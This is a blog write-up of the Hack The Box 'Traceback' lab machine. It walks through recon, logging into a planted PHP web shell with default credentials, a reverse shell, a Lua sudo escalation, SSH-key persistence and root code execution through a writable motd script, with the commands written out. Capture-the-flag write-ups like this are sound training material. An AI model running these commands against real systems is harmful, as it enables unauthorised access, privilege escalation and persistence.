I"C<p><img src="/wp-content/uploads/2020/08/traceback/badge.png" alt="Hack The Box Haystack" /></p>

<h1 id="introduction">Introduction</h1>
<p>Traceback is an easy level box. It’s one of the first boxes on which I’ve been able to get user and root in one sitting. There’s a little bit of OSINT and guess work involved in the initial foothold, and the user/root portions aren’t too difficult at all. The theme of the box is that it has already been compromised by another hacker (Xh4H who authoried the box), and you seem to be retracing their steps while gaining user and root flags.</p>

<h1 id="information-gathering">Information Gathering</h1>
<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 10.10.10.181
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 18:54 EDT
Nmap scan report for 10.10.10.181
Host is up (0.084s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds

</span></code></pre></div></div>
<p>The only open ports on the machine are <strong>22</strong> and <strong>80</strong>. These are all we’ll need to proceed through the rest of the box. so let’s take a look at what’s on the web port.</p>

<h3 id="port-80">Port 80</h3>
<p>Browsing to the website we can see that it’s been defaced, and apparently they’ve left a backdoor somewhere.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/port80.png" alt="port80" /><br />
<strong>Figure 1:</strong> This site has been owned by Xh4H.</p>

<p>Looking at the source code of the defaced page we find an HTML comment that indicates this backdoor is a webshell of some sort.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;center&gt;</span>
		<span class="nt">&lt;h1&gt;</span>This site has been owned<span class="nt">&lt;/h1&gt;</span>
		<span class="nt">&lt;h2&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h3&gt;</span> - Xh4H - <span class="nt">&lt;/h3&gt;</span>
		<span class="c">&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
	<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>

<h3 id="osint">OSINT</h3>
<p>After searching for <em>Xh4H</em> on Google, the first hit is a <a href="https://github.com/Xh4H/">GitHub profile</a>. Browsing through his repositories a bit there’s one called <a href="https://github.com/Xh4H/Web-Shells">Web-Shells</a> which he’s forked from another repository.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/web-shells.png" alt="web-shells" /><br />
<strong>Figure 2:</strong> Xh4H’s Web-Shells repository.</p>

<p>There are 16 different shells in this repo, 15 of which are <em>php</em> shells.</p>

<h1 id="exploitation">Exploitation</h1>
<h2 id="initial-foothold">Initial foothold</h2>
<p>Trying each shell in the repository we eventually find that <code class="language-plaintext highlighter-rouge">http:10.10.10.181/smevk.php</code> is the backdoor. This is the second to last shell in the repository.<br />
<img src="/wp-content/uploads/2020/08/traceback/smevk_login_page.png" alt="smevk_login_page" /><br />
<strong>Figure 3:</strong> We found the backdoor, but it’s closed.</p>

<p>There’s a login page to <code class="language-plaintext highlighter-rouge">smevk</code>, but it turns out that the credentials are simply <code class="language-plaintext highlighter-rouge">admin:admin</code>. That was my first guess.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/smevk_logged_in.png" alt="smevk_logged_in" /><br />
<strong>Figure 4:</strong> We’re in through the backdoor.</p>

<h2 id="user-flag">User Flag</h2>
<p>I’m a n00b, so I haven’t used many web shells besides <code class="language-plaintext highlighter-rouge">c99</code> and <code class="language-plaintext highlighter-rouge">p0wny</code>. As I explored the features of <code class="language-plaintext highlighter-rouge">smevk</code> I came to find some of them quite useful. The menu includes <em>Sec. Info</em>, <em>Files</em>, <em>Console</em>, <em>Bypasser</em>, <em>Safe Mode</em>, <em>String tools</em>, <em>Import Scripts</em>, <em>Network</em>, <em>Readable Dirs</em>, <em>Defacer</em>, <em>Code Injector</em>, <em>Domains</em>, and  <em>logout button</em>. A lot of these features seemed neat but the only ones I really utilized are the file explorer and the file uploader.</p>

<p>Navigating directly to the <code class="language-plaintext highlighter-rouge">/home</code> directory we see two users <code class="language-plaintext highlighter-rouge">sysadmin</code> and <code class="language-plaintext highlighter-rouge">webadmin</code>.<br />
<img src="/wp-content/uploads/2020/08/traceback/home_directory.png" alt="home_directory" /><br />
<strong>Figure 5:</strong> The <code class="language-plaintext highlighter-rouge">/home</code> directory shows two users.</p>

<p>In this case we’re logged in as <code class="language-plaintext highlighter-rouge">webadmin</code>, and don’t have access to the <code class="language-plaintext highlighter-rouge">sysadmin</code> directory. The flag  doesn’t appear to be in our <code class="language-plaintext highlighter-rouge">/home/webadmin</code> directory, but other useful things definitely are (<code class="language-plaintext highlighter-rouge">note.txt</code> and <code class="language-plaintext highlighter-rouge">.bash_history</code>).<br />
<img src="/wp-content/uploads/2020/08/traceback/home_webadmin.png" alt="home_webadmin" /><br />
<strong>Figure 6:</strong> Some interesting files in our home directory, but not flag.</p>

<p>Exploring the <code class="language-plaintext highlighter-rouge">note.txt</code> file we can see it mentions that there’s Lua installed on the box for us to “practice” with.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/note.png" alt="note" /><br />
<strong>Figure 7:</strong> Contents of <code class="language-plaintext highlighter-rouge">note.txt</code>.</p>

<p>Initially I thought that the <code class="language-plaintext highlighter-rouge">.bash_history</code> may have been a spoiler left by another user. I realize now though that we’re supposed to find it, and “trace back the steps” of the initial exploitation.  <code class="language-plaintext highlighter-rouge">.bash_history</code> tells us very explicitly where Lua is, and how to execute it as the <code class="language-plaintext highlighter-rouge">sysadmin</code> user. We simply need to create the <code class="language-plaintext highlighter-rouge">privesc.lua</code> file ourself as it appears to have been removed after execution.<br />
<img src="/wp-content/uploads/2020/08/traceback/what.png" alt="what" /><br />
<strong>Figure 8:</strong> The contents of <code class="language-plaintext highlighter-rouge">.bash_history</code> are basically a guide to getting the user flag.</p>

<p>We need only to look at <a href="https://gtfobins.github.io/gtfobins/lua/">GTFO Bins Lua section</a> to determine the syntax to launch a shell in Lua, something like <code class="language-plaintext highlighter-rouge">os.execute("/bin/sh")</code> will work.</p>

<p>To create our Lua script and launch it for a privilege escalation to <code class="language-plaintext highlighter-rouge">sysadmin</code> we’re going to need a reverse shell on the machine. To do this we’ll launch a netcat listener via <code class="language-plaintext highlighter-rouge">nc -lvp 4444</code> and upload a php revers shell named <code class="language-plaintext highlighter-rouge">x.php</code>. Navigating to <code class="language-plaintext highlighter-rouge">http:10.10.10.181/x.php</code> with trigger the reverse shell to call back to us.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/shell_upload.png" alt="shell_upload" /><br />
<strong>Figure 9:</strong> Uploading <code class="language-plaintext highlighter-rouge">x.php</code>, our reverse shell.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span>nc <span class="nt">-lvp</span> 4444
<span class="go">listening on [any] 4444 ...
connect to [10.10.15.38] from traceback.htb [10.10.10.181] 47416
</span><span class="gp">Linux traceback 4.15.0-58-generic #</span>64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
<span class="go"> 11:44:37 up  1:45,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w">   
</span></code></pre></div></div>

<p>Once we’ve got the reverse shell going we’ll create the Lua file next and execute it for privilege escalation to <code class="language-plaintext highlighter-rouge">sysadmin</code>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"os.execute('/bin/bash')"</span> <span class="o">&gt;</span> privesc.lua
<span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit privesc.lua
<span class="go">sh: turning off NDELAY mode
whoami
sysadmin
cd /home/sysadmin
cat user.txt
82f71c69e2692140bd21f923d0707f05
</span></code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>
<p>Before we start trying to escalate privileges to root we’re going to get a proper ssh session going on the box so that we don’t have to work within this reverse shell. To do so we’ll simply add our public key to <code class="language-plaintext highlighter-rouge">/home/sysadmin/.ssh/authorized_keys</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx7eDPx1R6wLygP7rzBH7L0PdPeMbZU1pyFpOJN45DuXiaor1bx2DksSKwNNPI7TiiTTNWplVdDGcW4p/ISVOoXLEP0W99QH8MB57HnMFShpuhNNJCCfhfLS1FEfD+iApR3RTZXnv13SBb/gLq21idHfBMes6A7Ba9Eba2gBbeWoIBF27PDXZER076r6LGHFdjHWFMJrdMOPDqdzYefBIVkGgbHqVRb0bd7IKi6NEMcAzL12BYnmIAXnJ789L+qDxGRam3hcImhV2mHpXpNJaunj9AUydxHgaKMY97x9REND2YGBPiCowb60qQTwDtIKfTEsAUOxJ6vQWVbdkxEsOr4HDe8azY30pL9vBjv8DT0rvC7ndVfy+maZ33sb/tvsVm5cw8mJZRnB/SEkHn4atDwR2CiX/FlWSmCV8s90bKBcRgJyW5+z7MyBTJ95g5hgGOpk20JEyl+P+EyZEai7l4j5ToCYnfmCX0ZdR3XNT3yI8oweCiRraHeiaqnn3Guxk= root@kali
" &gt;&gt; ~/.ssh/authorized_keys
</code></pre></div></div>

<p>Now we’ll ssh back into the box as <code class="language-plaintext highlighter-rouge">sysadmin</code>.<br />
<img src="/wp-content/uploads/2020/08/traceback/ssh_in_user.png" alt="ssh_in_user" /><br />
<strong>Figure 10:</strong> ssh’ing back in as <code class="language-plaintext highlighter-rouge">sysadmin</code> and launching bash.</p>

<p>To monitor the running processes we’ll download <a href="https://github.com/DominicBreuker/pspy">pspy</a> from our Kali box’s Apache server into the <code class="language-plaintext highlighter-rouge">/tmp</code> directory of the machine.</p>

<pre><code class="language-Console">sysadmin@traceback:~$ cd /tmp
sysadmin@traceback:/tmp$ wget http://10.10.15.38/pspy64
--2020-04-10 12:40:27--  http://10.10.15.38/pspy64
Connecting to 10.10.15.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M)
Saving to: ‘pspy64’

pspy64                              100%[=================================================================&gt;]   2.94M   808KB/s    in 4.9s    

2020-04-10 12:40:32 (611 KB/s) - ‘pspy64’ saved [3078592/3078592]

sysadmin@traceback:/tmp$
</code></pre>

<p>Launching it we can see that <code class="language-plaintext highlighter-rouge">/etc/.update-motd.d/</code> is being replaced about every 30 seconds. When we ssh’d into the box it was clear that this has been modified by the attacker previously. <strong>Welcome to Xh4H land</strong></p>

<p><img src="/wp-content/uploads/2020/08/traceback/pspy.png" alt="pspy" />
<strong>Figure 11:</strong> <code class="language-plaintext highlighter-rouge">/etc/.update-motd.d</code> being overwritten every 30 seconds from a backup directory.</p>

<p>We have permission as the <code class="language-plaintext highlighter-rouge">sysadmin</code> user to modify these files, and in doing so we can execute code as root.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@traceback:/etc/update-motd.d$ ls -lah
total 32K
drwxr-xr-x  2 root sysadmin 4.0K Aug 27  2019 .
drwxr-xr-x 80 root root     4.0K Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Apr 10 12:47 00-header
-rwxrwxr-x  1 root sysadmin  982 Apr 10 12:47 10-help-text
-rwxrwxr-x  1 root sysadmin 4.2K Apr 10 12:47 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Apr 10 12:47 80-esm
-rwxrwxr-x  1 root sysadmin  299 Apr 10 12:47 91-release-upgrade
</code></pre></div></div>

<p>We’ll modify the <code class="language-plaintext highlighter-rouge">00-header</code> file to copy the <code class="language-plaintext highlighter-rouge">sysadmin</code> user’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file into the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file of the <code class="language-plaintext highlighter-rouge">root</code> user.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@traceback:/etc/update-motd.d$ echo "ls -lah /root/.ssh &amp;&amp; cat /home/sysadmin/.ssh/authorized_keys &gt;&gt; /root/.ssh/authorized_keys &amp;&amp; cat /root/.ssh/authorized_keys" &gt;&gt; 00-header
</code></pre></div></div>

<p>Once we’ve done this, we quickly need to ssh into the box again before the <code class="language-plaintext highlighter-rouge">00-header</code> file is overwritten by the backup. If we do this quickly enough, our new login will trigger the code we’ve placed into <code class="language-plaintext highlighter-rouge">00-header</code> to be executed, and our <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> is copied into <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code>. Now we can ssh into the box as root and grab the flag.<br />
<strong>Note:</strong> Yes we could have just placed <code class="language-plaintext highlighter-rouge">cat /root/root.txt</code> into the <code class="language-plaintext highlighter-rouge">00-header</code> and gotten the flag that way, but getting a root shell is much more satisfying.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/rooted.png" alt="rooted" /><br />
<strong>Figure 12:</strong> f1af5eb9875c8514dbb32168383cfd52</p>

<h1 id="conclusion">Conclusion</h1>
<p>This box was fairly easy, which was nice because it’s rated as such. I enjoyed the theme of it, another hacker has compromised the machine and left messages around. Getting the user flag was really straight forward given the <code class="language-plaintext highlighter-rouge">.bash_history</code> file telling us exactly what to do. The path to root was extremely similar to the <a href="https://ryankozak.com/hack-the-box-writeup-4-writeup/">Writeup</a> box, and because of that it was kind of a breeze. It was quick and fairly fun, and that’s it.</p>

<h1 id="references">References</h1>
<ol>
  <li><a href="https://github.com/Xh4H/Web-Shells">Xh4H’s Web-Shells</a></li>
  <li><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentest Monkey’s PHP Reverse Shell</a></li>
  <li><a href="https://gtfobins.github.io/gtfobins/lua/">GTFO Bins Lua</a></li>
</ol>
:ET